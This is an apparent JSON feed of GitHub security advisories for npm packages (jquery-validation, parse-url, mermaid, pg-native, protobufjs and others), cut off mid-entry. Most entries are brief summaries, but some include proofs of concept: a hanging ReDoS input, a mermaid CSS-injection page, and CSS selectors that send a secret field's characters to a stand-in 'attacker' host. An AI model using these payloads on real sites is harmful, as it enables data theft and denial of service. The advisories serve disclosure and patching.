{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p><strong>Summary</strong></p>\n<p>The issue is the same as CVE-2021-43306: An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the jquery-validation npm package, when an attacker is able to supply arbitrary input to the url2 method</p>\n<p>The fix for CVE-2021-43306, which was suggested by me (<a href=\"https://github.com/erik-krogh\">@erik-krogh</a>), was incomplete. I didn't know at the time that the fix was incomplete, but the ReDoS analysis in CodeQL has improved since then.</p>\n<p><strong>Details</strong>\nIssue: ReDoS in url2.js (GHSL-2022-039)</p>\n<p>Below is a PoC that contains the relevant regular expression. Run following script with node and you will notice that it doesn't terminate.</p>\n<pre><code class=\"language-js\">const reg = /^(?:(?:(?:https?|ftp):)?\\/\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z0-9\\u00a1-\\uffff][a-z0-9\\u00a1-\\uffff_-]{0,62})?[a-z0-9\\u00a1-\\uffff]\\.?)+(?:[a-z\\u00a1-\\uffff]{2,}\\.?))(?::\\d{2,5})?(?:[/?#]\\S*)?$/i;\n\nconst str = \"//\" + \"00\".repeat(50)\n\nconsole.log(reg.test(str));\n...\n</code></pre>\n<p>The bad fix was identified using CodeQL, and the alert is visible on LGTM.com: <a href=\"https://lgtm.com/projects/g/jquery-validation/jquery-validation/snapshot/fec195de32da23c813b08a6a786a7f1cb6567069/files/src/additional/url2.js?sort=name&amp;dir=ASC&amp;mode=heatmap#x9013eb6c276f2ced:1\">https://lgtm.com/projects/g/jquery-validation/jquery-validation/snapshot/fec195de32da23c813b08a6a786a7f1cb6567069/files/src/additional/url2.js?sort=name&amp;dir=ASC&amp;mode=heatmap#x9013eb6c276f2ced:1</a>\nImpact</p>\n<p>This issue may lead to DoS.\nRemediation</p>\n<p>The new vulnerability has since been fixed in the gist that the regular expression was copy-pasted from: <a href=\"https://gist.github.com/dperini/729294#file-regex-weburl-js-L62\">https://gist.github.com/dperini/729294#file-regex-weburl-js-L62</a> So the fix is just to copy-paste that new version (copy pasted below).</p>\n<pre><code class=\"language-js\">/^(?:(?:(?:https?|ftp):)?\\/\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z0-9\\u00a1-\\uffff][a-z0-9\\u00a1-\\uffff_-]{0,62})?[a-z0-9\\u00a1-\\uffff]\\.)+(?:[a-z\\u00a1-\\uffff]{2,}\\.?))(?::\\d{2,5})?(?:[/?#]\\S*)?$/i\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jquery-validation/jquery-validation/security/advisories/GHSA-ffmh-x56j-9rc3\">https://github.com/jquery-validation/jquery-validation/security/advisories/GHSA-ffmh-x56j-9rc3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ffmh-x56j-9rc3\">https://github.com/advisories/GHSA-ffmh-x56j-9rc3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ffmh-x56j-9rc3",
            "title": "[jquery-validation] Regular Expression Denial of Service in jquery-validation",
            "date_modified": "2022-07-05T22:56:59.000Z",
            "date_published": "2022-07-05T22:56:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ffmh-x56j-9rc3"
            }
        },
        {
            "content_html": "<p>Authorization Bypass Through User-Controlled Key in GitHub repository ionicabizau/parse-path prior to 5.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0624\">https://nvd.nist.gov/vuln/detail/CVE-2022-0624</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-path/commit/f9ad8856a3c8ae18e1cf4caef5edbabbc42840e8\">https://github.com/ionicabizau/parse-path/commit/f9ad8856a3c8ae18e1cf4caef5edbabbc42840e8</a></li>\n<li><a href=\"https://huntr.dev/bounties/afffb2bd-fb06-4144-829e-ecbbcbc85388\">https://huntr.dev/bounties/afffb2bd-fb06-4144-829e-ecbbcbc85388</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3j8f-xvm3-ffx4\">https://github.com/advisories/GHSA-3j8f-xvm3-ffx4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3j8f-xvm3-ffx4",
            "title": "[parse-path] Authorization Bypass in parse-path",
            "date_modified": "2022-07-05T22:13:38.000Z",
            "date_published": "2022-06-29T00:00:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3j8f-xvm3-ffx4"
            }
        },
        {
            "content_html": "<p>Cross-site Scripting (XSS) - Generic in GitHub repository ionicabizau/parse-url prior to 6.0.1</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2217\">https://nvd.nist.gov/vuln/detail/CVE-2022-2217</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\">https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3</a></li>\n<li><a href=\"https://huntr.dev/bounties/4e046c63-b1ca-4bcc-b418-29796918a71b\">https://huntr.dev/bounties/4e046c63-b1ca-4bcc-b418-29796918a71b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q6wq-5p59-983w\">https://github.com/advisories/GHSA-q6wq-5p59-983w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q6wq-5p59-983w",
            "title": "[parse-url] Cross site scripting in parse-url",
            "date_modified": "2022-07-05T22:07:56.000Z",
            "date_published": "2022-06-28T00:01:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q6wq-5p59-983w"
            }
        },
        {
            "content_html": "<p>Server-Side Request Forgery (SSRF) in GitHub repository ionicabizau/parse-url prior to 7.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2216\">https://nvd.nist.gov/vuln/detail/CVE-2022-2216</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\">https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3</a></li>\n<li><a href=\"https://huntr.dev/bounties/505a3d39-2723-4a06-b1f7-9b2d133c92e1\">https://huntr.dev/bounties/505a3d39-2723-4a06-b1f7-9b2d133c92e1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7f3x-x4pr-wqhj\">https://github.com/advisories/GHSA-7f3x-x4pr-wqhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7f3x-x4pr-wqhj",
            "title": "[parse-url] Server-Side Request Forgery in parse-url",
            "date_modified": "2022-07-05T22:07:54.000Z",
            "date_published": "2022-06-28T00:01:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7f3x-x4pr-wqhj"
            }
        },
        {
            "content_html": "<p>Cross-site Scripting (XSS) - Stored in GitHub repository ionicabizau/parse-url prior to 7.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2218\">https://nvd.nist.gov/vuln/detail/CVE-2022-2218</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\">https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3</a></li>\n<li><a href=\"https://huntr.dev/bounties/024912d3-f103-4daf-a1d0-567f4d9f2bf5\">https://huntr.dev/bounties/024912d3-f103-4daf-a1d0-567f4d9f2bf5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpp7-7chh-cf67\">https://github.com/advisories/GHSA-jpp7-7chh-cf67</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpp7-7chh-cf67",
            "title": "[parse-url] Cross site scripting in parse-url",
            "date_modified": "2022-07-05T22:07:17.000Z",
            "date_published": "2022-06-28T00:01:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpp7-7chh-cf67"
            }
        },
        {
            "content_html": "<p>Exposure of Sensitive Information to an Unauthorized Actor via hostname confusion in GitHub repository ionicabizau/parse-url prior to 6.0.1</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0722\">https://nvd.nist.gov/vuln/detail/CVE-2022-0722</a></li>\n<li><a href=\"https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3\">https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3</a></li>\n<li><a href=\"https://huntr.dev/bounties/2490ef6d-5577-4714-a4dd-9608251b4226\">https://huntr.dev/bounties/2490ef6d-5577-4714-a4dd-9608251b4226</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4p35-cfcx-8653\">https://github.com/advisories/GHSA-4p35-cfcx-8653</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4p35-cfcx-8653",
            "title": "[parse-url] Hostname confusion in parse-url",
            "date_modified": "2022-07-05T22:05:54.000Z",
            "date_published": "2022-06-28T00:01:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4p35-cfcx-8653"
            }
        },
        {
            "content_html": "<p>Improperly handled errors in @discordjs/opus cause hard crashes instead of returning the error to user land.\", \"details\": \"All versions of package @discordjs/opus (&lt;= 0.7.0) are vulnerable to Denial of Service (DoS) when trying to encode using an encoder with zero channels, or a non-initialized buffer. This leads to a hard crash due to improperly returning the errors from the invalid inputs.</p>\n<p>As of version 0.8.0, the errors are correctly returned to the user and are no longer throwing hard crashes that cannot be recovered.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25345\">https://nvd.nist.gov/vuln/detail/CVE-2022-25345</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-DISCORDJSOPUS-2403100\">https://snyk.io/vuln/SNYK-JS-DISCORDJSOPUS-2403100</a></li>\n<li><a href=\"https://github.com/discordjs/opus/blob/3ca4341ffdd81cf83cec57045e59e228e6017590/src/node-opus.cc#L28\">https://github.com/discordjs/opus/blob/3ca4341ffdd81cf83cec57045e59e228e6017590/src/node-opus.cc#L28</a></li>\n<li><a href=\"https://github.com/discordjs/opus/commit/406249f3fca484a2af97a34ceb989019efa09bc7\">https://github.com/discordjs/opus/commit/406249f3fca484a2af97a34ceb989019efa09bc7</a></li>\n<li><a href=\"https://github.com/discordjs/opus/releases/tag/v0.8.0\">https://github.com/discordjs/opus/releases/tag/v0.8.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rvgf-69j7-xh78\">https://github.com/advisories/GHSA-rvgf-69j7-xh78</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rvgf-69j7-xh78",
            "title": "[@discordjs/opus] Uncontrolled Resource Consumption in @discordjs/opus",
            "date_modified": "2022-07-05T21:23:17.000Z",
            "date_published": "2022-06-18T00:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rvgf-69j7-xh78"
            }
        },
        {
            "content_html": "<p>An attacker is able to inject arbitrary <code>CSS</code> into the generated graph allowing them to change the styling of elements outside of the generated graph, and potentially exfiltrate sensitive information by using specially crafted <code>CSS</code> selectors.</p>\n<p>The following example shows how an attacker can exfiltrate the contents of an input field by bruteforcing the <code>value</code> attribute one character at a time. Whenever there is an actual match, an <code>http</code> request will be made by the browser in order to \"load\" a background image that will let an attacker know what's the value of the character.</p>\n<pre><code class=\"language-css\">input[name=secret][value^=g] { background-image: url(http://attacker/?char=g); }\n...\ninput[name=secret][value^=go] { background-image: url(http://attacker/?char=o); }\n...\ninput[name=secret][value^=goo] { background-image: url(http://attacker/?char=o); }\n...\ninput[name=secret][value^=goos] { background-image: url(http://attacker/?char=s); }\n...\ninput[name=secret][value^=goose] { background-image: url(http://attacker/?char=e); }\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"http://example.com\">example link to repo</a></li>\n<li>Email us at <a href=\"mailto:example@example.com\">example email address</a></li>\n</ul>\n<h2 id=\"product\">Product</h2>\n<p>mermaid.js</p>\n<h2 id=\"tested-version\">Tested Version</h2>\n<p><a href=\"https://github.com/mermaid-js/mermaid/releases/tag/9.1.1\">v9.1.1</a></p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"issue-1-multiple-css-injection-ghsl-2022-036\">Issue 1: Multiple CSS Injection (<code>GHSL-2022-036</code>)</h3>\n<p>By supplying a carefully crafted <code>textColor</code> theme variable, an attacker can inject arbitrary <code>CSS</code> rules into the document. In the following snippet we can see that <code>getStyles</code> does not sanitize any of the theme variables leaving the door open for <code>CSS</code> injection.</p>\n<p><em>Snippet from <a href=\"https://github.com/mermaid-js/mermaid/blob/9eae97ddab1b6eca58d2fd4af62357d2f4d8d1f7/src/styles.js#L35\">src/styles.js</a>:</em></p>\n<pre><code class=\"language-js\">const getStyles = (type, userStyles, options) =&gt; {\n  return ` {\n    font-family: ${options.fontFamily};\n    font-size: ${options.fontSize};\n    fill: ${options.textColor}\n  }\n</code></pre>\n<p>For example, if we set <code>textColor</code> to <code>\"green;} #target { background-color: crimson }\"</code> the resulting <code>CSS</code> will contain a new selector <code>#target</code> that will apply a <code>crimson</code> background color to an arbitrary element.</p>\n<pre><code class=\"language-html\">&lt;html&gt;\n\n&lt;body&gt;\n    &lt;div id=\"target\"&gt;\n        &lt;h1&gt;This element does not belong to the SVG but we can style it&lt;/h1&gt;\n    &lt;/div&gt;\n    &lt;svg id=\"diagram\"&gt;\n    &lt;/svg&gt;\n\n    &lt;script src=\"https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js\"&gt;&lt;/script&gt;\n    &lt;script&gt;\n        mermaid.initialize({ startOnLoad: false });\n\n        const graph =\n            `\n            %%{ init: { \"themeVariables\" : { \"textColor\": \"green;} #target { background-color: crimson }\" } } }%%\n            graph TD\n                A[Goose]\n            `\n\n        const diagram = document.getElementById(\"diagram\")\n        const svg = mermaid.render('diagram-svg', graph)\n        diagram.innerHTML = svg\n    &lt;/script&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n<p>In the proof of concept above we used the <code>textColor</code> variable to inject <code>CSS</code>, but there are multiple functions that can potentially be abused to change the style of the document. Some of them are in the following list but we encourage mantainers to look for additional injection points:</p>\n<ul>\n<li><a href=\"https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393\">https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393</a></li>\n<li><a href=\"https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35\">https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35</a></li>\n</ul>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue may lead to <code>Information Disclosure</code> via CSS selectors and functions able to generate HTTP requests. This also allows an attacker to change the document in ways which may lead a user to perform unintended actions, such as clicking on a link, etc.</p>\n<h4 id=\"remediation\">Remediation</h4>\n<p>Ensure that user input is adequately escaped before embedding it in CSS blocks.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mermaid-js/mermaid/security/advisories/GHSA-x3vm-38hw-55wf\">https://github.com/mermaid-js/mermaid/security/advisories/GHSA-x3vm-38hw-55wf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31108\">https://nvd.nist.gov/vuln/detail/CVE-2022-31108</a></li>\n<li><a href=\"https://github.com/mermaid-js/mermaid/commit/0ae1bdb61adff1cd485caff8c62ec6b8ac57b225\">https://github.com/mermaid-js/mermaid/commit/0ae1bdb61adff1cd485caff8c62ec6b8ac57b225</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x3vm-38hw-55wf\">https://github.com/advisories/GHSA-x3vm-38hw-55wf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x3vm-38hw-55wf",
            "title": "[mermaid] Possible inject arbitrary `CSS` into the generated graph affecting the container HTML",
            "date_modified": "2022-07-05T18:29:36.000Z",
            "date_published": "2022-07-05T18:29:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x3vm-38hw-55wf"
            }
        },
        {
            "content_html": "<p>All versions of package pg-native; all versions of package libpq are vulnerable to Denial of Service (DoS) when the addons attempt to cast the second argument to an array and fail. This happens for every non-array argument passed. <strong>Note:</strong> pg-native is a mere binding to npm's libpq library, which in turn has the addons and bindings to the actual C libpq library. This means that problems found in pg-native may transitively impact npm's libpq.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25852\">https://nvd.nist.gov/vuln/detail/CVE-2022-25852</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-LIBPQ-2392366\">https://snyk.io/vuln/SNYK-JS-LIBPQ-2392366</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-PGNATIVE-2392365\">https://snyk.io/vuln/SNYK-JS-PGNATIVE-2392365</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j32j-2hxv-rqf7\">https://github.com/advisories/GHSA-j32j-2hxv-rqf7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j32j-2hxv-rqf7",
            "title": "[pg-native] Uncontrolled Resource Consumption in pg-native and libpq",
            "date_modified": "2022-06-29T21:53:02.000Z",
            "date_published": "2022-06-18T00:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j32j-2hxv-rqf7"
            }
        },
        {
            "content_html": "<p>All versions of package pg-native; all versions of package libpq are vulnerable to Denial of Service (DoS) when the addons attempt to cast the second argument to an array and fail. This happens for every non-array argument passed. <strong>Note:</strong> pg-native is a mere binding to npm's libpq library, which in turn has the addons and bindings to the actual C libpq library. This means that problems found in pg-native may transitively impact npm's libpq.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25852\">https://nvd.nist.gov/vuln/detail/CVE-2022-25852</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-LIBPQ-2392366\">https://snyk.io/vuln/SNYK-JS-LIBPQ-2392366</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-PGNATIVE-2392365\">https://snyk.io/vuln/SNYK-JS-PGNATIVE-2392365</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j32j-2hxv-rqf7\">https://github.com/advisories/GHSA-j32j-2hxv-rqf7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j32j-2hxv-rqf7",
            "title": "[libpq] Uncontrolled Resource Consumption in pg-native and libpq",
            "date_modified": "2022-06-29T21:53:02.000Z",
            "date_published": "2022-06-18T00:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j32j-2hxv-rqf7"
            }
        },
        {
            "content_html": "<p>All versions of package deep-get-set are vulnerable to Prototype Pollution via the 'deep' function. <strong>Note:</strong> This vulnerability derives from an incomplete fix of <a href=\"https://security.snyk.io/vuln/SNYK-JS-DEEPGETSET-598666\">CVE-2020-7715</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21231\">https://nvd.nist.gov/vuln/detail/CVE-2022-21231</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-DEEPGETSET-2342655\">https://snyk.io/vuln/SNYK-JS-DEEPGETSET-2342655</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mjjj-6p43-vhhv\">https://github.com/advisories/GHSA-mjjj-6p43-vhhv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mjjj-6p43-vhhv",
            "title": "[deep-get-set] Prototype Pollution in deep-get-set",
            "date_modified": "2022-06-29T21:52:19.000Z",
            "date_published": "2022-06-25T00:00:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mjjj-6p43-vhhv"
            }
        },
        {
            "content_html": "<p>Prototype pollution vulnerability in ‘just-safe-set’ versions 1.0.0 through 2.2.1 allows an attacker to cause a denial of service and may lead to remote code execution.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-25952\">https://nvd.nist.gov/vuln/detail/CVE-2021-25952</a></li>\n<li><a href=\"https://github.com/angus-c/just/pull/267\">https://github.com/angus-c/just/pull/267</a></li>\n<li><a href=\"https://github.com/angus-c/just/commit/dd57a476f4bb9d78c6f60741898dc04c71d2eb53\">https://github.com/angus-c/just/commit/dd57a476f4bb9d78c6f60741898dc04c71d2eb53</a></li>\n<li><a href=\"https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25952\">https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25952</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v26w-gcxh-v4r7\">https://github.com/advisories/GHSA-v26w-gcxh-v4r7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v26w-gcxh-v4r7",
            "title": "[just-safe-set] Prototype polluation in just-safe-set",
            "date_modified": "2022-06-29T20:42:16.000Z",
            "date_published": "2021-12-10T18:50:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v26w-gcxh-v4r7"
            }
        },
        {
            "content_html": "<p>An issue was discovered in an npm 5.7.0 2018-02-21 pre-release (marked as \"next: 5.7.0\" and therefore automatically installed by an \"npm upgrade -g npm\" command, and also announced in the vendor's blog without mention of pre-release status). It might allow local users to bypass intended filesystem access restrictions because ownerships of /etc and /usr directories are being changed unexpectedly, related to a \"correctMkdir\" issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-7408\">https://nvd.nist.gov/vuln/detail/CVE-2018-7408</a></li>\n<li><a href=\"https://github.com/npm/npm/issues/19883\">https://github.com/npm/npm/issues/19883</a></li>\n<li><a href=\"https://github.com/npm/npm/commit/74e149da6efe6ed89477faa81fef08eee7999ad0\">https://github.com/npm/npm/commit/74e149da6efe6ed89477faa81fef08eee7999ad0</a></li>\n<li><a href=\"http://blog.npmjs.org/post/171169301000/v571\">http://blog.npmjs.org/post/171169301000/v571</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ph34-pc88-72gc\">https://github.com/advisories/GHSA-ph34-pc88-72gc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ph34-pc88-72gc",
            "title": "[npm] Incorrect Permission Assignment for Critical Resource in NPM",
            "date_modified": "2022-06-28T23:53:13.000Z",
            "date_published": "2022-05-13T01:53:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ph34-pc88-72gc"
            }
        },
        {
            "content_html": "<p>The utilities function in all versions &lt; 1.0.1 of the deap node module can be tricked into modifying the prototype of Object when the attacker can control part of the structure passed to this function. This can let an attacker add or modify existing properties that will exist on all objects.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-3749\">https://nvd.nist.gov/vuln/detail/CVE-2018-3749</a></li>\n<li><a href=\"https://hackerone.com/reports/310446\">https://hackerone.com/reports/310446</a></li>\n<li><a href=\"https://github.com/selfcontained/deap/commit/ed27b7e890bdd616e1ee931ea1c64228e2b52a71\">https://github.com/selfcontained/deap/commit/ed27b7e890bdd616e1ee931ea1c64228e2b52a71</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xg47-r67p-vhv5\">https://github.com/advisories/GHSA-xg47-r67p-vhv5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xg47-r67p-vhv5",
            "title": "[deap] Improper Input Validation in Deap",
            "date_modified": "2022-06-28T23:46:37.000Z",
            "date_published": "2022-05-14T03:05:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xg47-r67p-vhv5"
            }
        },
        {
            "content_html": "<p>Blamer versions prior to 1.0.1 allows execution of arbitrary commands. It is possible to inject arbitrary commands as part of the arguments provided to blamer.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-10807\">https://nvd.nist.gov/vuln/detail/CVE-2019-10807</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-BLAMER-559541\">https://snyk.io/vuln/SNYK-JS-BLAMER-559541</a></li>\n<li><a href=\"https://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c\">https://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8cxp-cjm8-fj36\">https://github.com/advisories/GHSA-8cxp-cjm8-fj36</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8cxp-cjm8-fj36",
            "title": "[blamer] Improper Neutralization of Special Elements used in an OS Command in Blamer",
            "date_modified": "2022-06-28T15:22:17.000Z",
            "date_published": "2022-05-24T17:10:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8cxp-cjm8-fj36"
            }
        },
        {
            "content_html": "<p>Engine.IO before 4.0.0 and 3.6.0 allows attackers to cause a denial of service (resource consumption) via a POST request to the long polling transport.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-36048\">https://nvd.nist.gov/vuln/detail/CVE-2020-36048</a></li>\n<li><a href=\"https://github.com/socketio/engine.io/commit/734f9d1268840722c41219e69eb58318e0b2ac6b\">https://github.com/socketio/engine.io/commit/734f9d1268840722c41219e69eb58318e0b2ac6b</a></li>\n<li><a href=\"https://blog.caller.xyz/socketio-engineio-dos/\">https://blog.caller.xyz/socketio-engineio-dos/</a></li>\n<li><a href=\"https://github.com/bcaller/kill-engine-io\">https://github.com/bcaller/kill-engine-io</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j4f2-536g-r55m\">https://github.com/advisories/GHSA-j4f2-536g-r55m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j4f2-536g-r55m",
            "title": "[engine.io] Resource exhaustion in engine.io ",
            "date_modified": "2022-06-27T23:47:40.000Z",
            "date_published": "2022-02-09T22:29:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j4f2-536g-r55m"
            }
        },
        {
            "content_html": "<p>The package protobufjs before 6.11.3 and 6.10.3 is vulnerable to Prototype Pollution, which can allow an attacker to add/modify properties of the Object.prototype.</p>\n<p>This vulnerability can occur in multiple ways:</p>\n<ol>\n<li>by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions</li>\n<li>by parsing/loading .proto files</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25878\">https://nvd.nist.gov/vuln/detail/CVE-2022-25878</a></li>\n<li><a href=\"https://github.com/protobufjs/protobuf.js/pull/1731\">https://github.com/protobufjs/protobuf.js/pull/1731</a></li>\n<li><a href=\"https://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f\">https://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f</a></li>\n<li><a href=\"https://github.com/protobufjs/protobuf.js/blob/d13d5d5688052e366aa2e9169f50dfca376b32cf/src/util.js%23L176-L197\">https://github.com/protobufjs/protobuf.js/blob/d13d5d5688052e366aa2e9169f50dfca376b32cf/src/util.js%23L176-L197</a></li>\n<li><a 